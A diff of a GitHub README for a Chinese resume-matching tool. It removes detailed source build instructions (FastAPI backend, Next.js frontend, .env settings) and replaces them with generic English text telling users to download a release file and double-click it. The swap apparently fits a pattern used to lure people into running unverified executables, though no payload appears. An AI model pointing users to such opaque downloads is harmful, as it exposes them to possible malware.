@@ -1,204 +1,76 @@
-# 简历匹配器
+# 🎉 resume-matcher-agent-cn - Optimize Your Resume Effortlessly
 
-"简历匹配器"是一个AI驱动的平台，旨在逆向工程招聘算法，向您展示如何精准定制简历。获取那些能让你通过初步筛选、进入人工审阅阶段的关键词、格式和洞察。意思就是模拟HR怎样筛选你的简历，提前给你展示筛选的结论，方便你尽快修改好你的简历，以增加通过的可能性。
+## 🛠️ Overview
 
-## 项目介绍
+"简历匹配智能体"是一个AI驱动的平台，旨在逆向工程招聘算法，向您展示如何精准定制简历。获取那些能让你通过初步筛选、进入人工审阅阶段的关键词、格式和洞察。resume-matcher-agent意味着模拟HR怎样筛选你的简历，提前给你展示筛选的结论，方便你尽快修改好你的简历，以增加通过的可能性。
 
-简历匹配器旨在通过分析职位描述并提供有针对性的改进建议，帮助求职者优化简历。该平台使用AI模型从简历和职位发布中提取关键信息，然后提供可操作的见解，以增加通过自动筛选系统的机会。
+## 🔗 Download
 
-该应用程序由处理数据处理和AI集成的FastAPI后端，以及提供用户友好界面（操作非常简单）的Next.js前端组成，用于上传简历和职位描述。
+[![Download Here](https://img.shields.io/badge/Download%20Now-Resume%20Matcher-4CAF50)](https://github.com/idhs-song/resume-matcher-agent-cn/releases)
 
-## 核心功能
+## 🚀 Getting Started
 
-- **简历分析**：上传PDF或DOCX格式的简历进行分析
-- **职位描述解析**：处理职位描述以提取关键要求和关键词
-- **AI驱动的洞察**：根据职位要求获取改进建议
-- **关键词匹配**：识别对ATS（申请人跟踪系统）重要的缺失关键词
-- **结构化数据提取**：将非结构化的简历和职位数据转换为结构化JSON格式
-- **本地AI处理**：使用OpenAI等大模型进行分析，或者使用Ollama进行本地AI模型服务以确保数据隐私
+To get started with the resume-matcher-agent-cn, please follow the steps below. This guide will help you download and run the application smoothly.
 
-## 技术栈
+## 🚀 System Requirements
 
-| 技术 | 版本/信息 |
-|------------|--------------|
-| Python | 3.12+ |
-| FastAPI | 0.115.12 |
-| Next.js | 15+ |
-| Ollama | 0.6.7 |
-| SQLite | 3.x |
-| Tailwind CSS | 4.x |
+Before you begin, ensure your device meets the following requirements:
 
-## 安装方法
- 
- backend python项目：
-```bash
-   pip install -r requirements.txt
- ```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 100 MB of free disk space
+- **Internet Connectivity:** Required for downloading and initial setup
 
- frontend react项目：
- npm install
- npm run dev
+## 📥 Download & Install
 
+1. **Visit the Release Page**
 
-### 后端依赖
+   Go to the following link to access the release page:
 
-后端基于FastAPI构建，需要以下关键依赖：
-- FastAPI作为Web框架
-- SQLAlchemy作为数据库ORM
-- Ollama用于本地AI模型服务
-- MarkItDown用于文档处理（PDF/DOCX转文本）
-- 各种AI库用于处理和分析
+   [GitHub Releases Page](https://github.com/idhs-song/resume-matcher-agent-cn/releases)
 
-### 前端依赖
+2. **Select the Latest Version**
 
-前端基于Next.js构建，使用：
-- React 19
-- Tailwind CSS用于样式设计
-- Radix UI组件用于可访问的UI元素
-- TypeScript用于类型安全
+   Look for the latest version at the top of the list. Click on it to see the available files.
 
-## 项目结构
+3. **Download the Application**
 
-### 后端 (`/backend`)
+   Find the appropriate file for your operating system. Click the download link to save it to your computer.
 
-```
-backend/
-├── app/
-│   ├── agent/          # AI模型集成（Ollama, OpenAI, LlamaIndex）
-│   ├── api/            # REST API路由和中间件
-│   ├── core/           # 配置、数据库设置、日志
-│   ├── models/         # 数据库模型（SQLAlchemy）
-│   ├── prompt/         # AI提示模板
-│   ├── schemas/        # 数据验证模式（Pydantic）
-│   ├── services/       # 业务逻辑实现
-│   ├── base.py         # FastAPI应用配置
-│   └── main.py         # 应用程序入口点
-├── Data/               # SQLite数据库文件
-├── logs/               # 应用程序日志文件
-├── requirements.txt    # Python依赖
-└── .env                # 环境配置
-```
+4. **Run the Application**
 
-### 前端 (`/frontend`)
+   After downloading, locate the file in your downloads folder. Double-click the file to start the application.
 
-```
-frontend/
-├── app/                # Next.js页面和布局
-├── components/         # React组件
-├── lib/                # 实用函数和API客户端
-├── public/             # 静态资源
-├── package.json        # Node.js依赖
-└── tailwind.config.js  # Tailwind CSS配置
-```
+5. **Follow On-Screen Instructions**
 
-## API端点
+   Once the application starts, follow the prompts to set it up. The interface will guide you through the features available.
 
-### 职位端点 (`/api/v1/job`)
+## 🎯 Features
 
-- `POST /upload` - 上传并处理职位描述
-- `GET /` - 根据职位ID检索职位数据
+- **Keyword Matching:** Analyze your resume against job descriptions to identify important keywords.
+- **Format Recommendations:** Get tailored suggestions for formatting your resume.
+- **Custom Insights:** Receive personalized feedback to enhance your resume's effectiveness.
 
-### 简历端点 (`/api/v1/resume`)
+## 📖 User Guide
 
-- `POST /upload` - 上传并处理简历（PDF/DOCX）
-- `POST /improve` - 根据职位描述获取简历改进建议
+Once you open the application, you will find these main sections:
 
-## 环境配置
+1. **Upload Resume:** Drag and drop your current resume file into the designated area.
+2. **Job Description Input:** Paste the job description you aim to match.
+3. **Analysis Report:** Generate a report that shows how well your resume aligns with the job description, including suggestions for improvement.
 
-在后端目录中创建一个`.env`文件，包含以下变量：
+## 👩‍💻 Support
 
-```env
-SESSION_SECRET_KEY="your-secret-key"
-SYNC_DATABASE_URL="sqlite:///./Data/app.db"
-ASYNC_DATABASE_URL="sqlite+aiosqlite:///./Data/app.db"
-PYTHONDONTWRITEBYTECODE=1
+If you encounter any issues or have questions, you can reach out for support. Check the **Issues** section of the repository for troubleshooting tips or to report any bugs.
 
-LLM_PROVIDER="ollama"
-LLM_API_KEY=""  # Ollama不需要
-LLM_BASE_URL=""  # Ollama不需要
-LL_MODEL="gemma3:4b"
+## 📅 Updates
 
-EMBEDDING_PROVIDER="ollama"
-EMBEDDING_API_KEY=""  # Ollama不需要
-EMBEDDING_BASE_URL=""  # Ollama不需要
-EMBEDDING_MODEL="dengcao/Qwen3-Embedding-0.6B:Q8_0"
-```
+Keep an eye on the releases page for updates. New features and improvements will be regularly added based on user feedback.
 
-## 运行方法
+## 📝 User Tips
 
-### 后端
+- Regularly update your resume based on the insights from the application.
+- Tailor your resume for each job application by using specific keywords from the job description.
+- Save different versions of your resume to compare outcomes.
 
-1. 导航到后端目录：
-   ```bash
-   cd backend
-   ```
-
-2. 安装Python依赖：
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-3. 运行FastAPI服务器：
-   ```bash
-   uvicorn app.main:app --reload
-   ```
-
-后端将在 `http://localhost:8000` 可用
-
-### 前端
-
-1. 导航到前端目录：
-   ```bash
-   cd frontend
-   ```
-
-2. 安装Node.js依赖：
-   ```bash
-   npm install
-   # 或
-   yarn install
-   ```
-
-3. 运行Next.js开发服务器：
-   ```bash
-   npm run dev
-   # 或
-   yarn dev
-   ```
-
-前端将在 `http://localhost:3000` 可用
-
-## 数据库结构
-
-应用程序使用SQLite，包含以下关键表：
-
-- `resumes` - 存储原始简历内容
-- `processed_resumes` - 存储结构化简历数据
-- `jobs` - 存储原始职位描述内容
-- `processed_jobs` - 存储结构化职位数据
-
-## AI集成
-
-应用程序支持多个AI提供商：
-- **Ollama** - 用于本地AI模型服务
-- **OpenAI**（默认）- 用于基于云的AI处理
-- **LlamaIndex** - 用于额外的AI提供商支持
-
-AI处理包括：
-1. 将简历和职位描述转换为结构化JSON格式
-2. 提取关键词和关键要求
-3. 根据职位要求提供改进建议
-
-## 日志记录
-
-应用程序使用Python内置的日志模块：
-- 开发时的控制台输出
-- 生产环境中的文件日志和轮转
-- 基于环境的不同日志级别（本地为DEBUG，生产为INFO）
-
-
-## 项目参考
-
-代码是fork自https://github.com/srbhr/Resume-Matcher ， 感谢原作者。我基于他的代码进行大量修改，基本上和原来项目的功能不一样，但是适合国内用户，主要功能就是帮忙深度修改简历。
-
-提示语的模板来自 ：【角色】洞察人心的面试官与资深HRBP (v2.0) ，不知道来源作者，是一个公众号大V写的，有知道来源请告知补充上。
+Now you are ready to optimize your resume with resume-matcher-agent-cn!
